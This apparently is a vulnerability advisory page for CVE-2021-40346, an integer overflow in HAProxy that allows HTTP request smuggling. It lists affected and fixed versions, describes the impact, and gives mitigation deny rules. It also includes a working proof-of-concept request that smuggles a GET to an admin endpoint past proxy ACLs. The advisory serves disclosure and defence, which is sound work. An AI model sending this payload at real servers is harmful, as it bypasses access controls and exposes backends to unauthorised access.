{"hash":"6d5fa28a35d287d5da24adb460fc530e555915a1","data":{"post":{"title":"Integer overflow in HAProxy leads to HTTP Smuggling","path":"/vulnerabilities/integer-overflow-in-haproxy-leads-to-http-smuggling-xray-184496/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>An integer overflow in HAProxy leads to HTTP Smuggling via simple network requests</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p><a href=\"http://www.haproxy.org/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">HAProxy</a></p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>HAProxy [2.0 - 2.0.24], fixed in 2.0.25\nHAProxy [2.1 - 2.1*], no fix. unmaintained version\nHAProxy [2.2 - 2.2.16], fixed in 2.2.17\nHAProxy [2.3 - 2.3.13], fixed in 2.3.14\nHAProxy [2.4 - 2.4.3], fixed in 2.4.4\nHAProxy Enterprise [2.0r1 - 2.0r1-1.0.0-234.1215], fixed in 2.0r1-1.0.0-235.1230\nHAProxy Enterprise [2.1r1 - 2.1r1-1.0.0-238.612], fixed in 2.1r1-1.0.0-238.625\nHAProxy Enterprise [2.2r1 - 2.2r1-1.0.0-241.491], fixed in 2.2r1-1.0.0-241.505\nHAProxy Enterprise [2.3r1 - 2.3r1-1.0.0-242.330], fixed in 2.3r1-1.0.0-242.345\nHAProxy Enterprise [2.4r1 - 2.4r1], fixed in 2.4r1-1.0.0-253.271\nHAproxy Kubernetes Ingress Controller [1.6 - 1.6.6], fixed in 1.6.7\nHAproxy Enterprise Kubernetes Ingress Controller [1.6 - 1.6.6], fixed in 1.6.7\nHAProxy ALOHA [11.5 - 11.5.12], fixed in 11.5.13\nHAProxy ALOHA [12.5 - 12.5.4], fixed in 12.5.5\nHAProxy ALOHA [13.0 - 13.0.6], fixed in 13.0.7</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>Due to an integer overflow, a parsing error is created in HAProxy that allows an attacker to specify two <code>Content-Length</code> headers with different sizes. Subsequently, this allows an attacker to perform HTTP smuggling. This attack allows an adversary to smuggle HTTP requests to the backend server, without the proxy server being aware of it. The smuggled requests have various impacts, depending on HAProxyâ€™s configuration and the backend web server configuration: Bypassing security controls, including any ACLs defined in HAProxy, Gaining unauthorized access to sensitive data, Executing unauthorized commands or modifying data, Hijacking user sessions, Exploiting a reflected XSS vulnerability without user interaction.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<p>Any attacker that can send requests through the proxy, can exploit this vulnerability, by sending requests such as:</p>\n<pre><code>POST /index.html HTTP/1.1\nHost: abc.com\nContent-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\nContent-Length: 60\n\nGET /admin/add_user.py HTTP/1.1\nHost: abc.com\nabc: xyz\n</code></pre>\n<p>The GET request will be smuggled and will evade any ACLs defined in the HAProxy configuration file.</p>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>If you are not able to update right away, you can apply the following rules to your HAProxy configuration file to mitigate the vulnerabilities. These should be added to your frontend.</p>\n<pre><code>frontend myfrontend\nhttp-request deny if { req.hdr_cnt(content-length) gt 1 }\nhttp-response deny if { res.hdr_cnt(content-length) gt 1 }\n</code></pre>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">(JFrog) Critical vulnerability in HAProxy </a></p>\n<p><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-40346\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">NVD</a></p>\n","description":"CVE-2021-40346 High severity. An integer overflow in HAProxy leads to HTTP Smuggling via simple network requests","date_published":"2021-07-09","xray_id":"XRAY-184496","vul_id":"CVE-2021-40346","severity":"high","discovered_by":"Ori Hollander","last_updated":"2021-07-09","cvss":7.5}},"context":{}}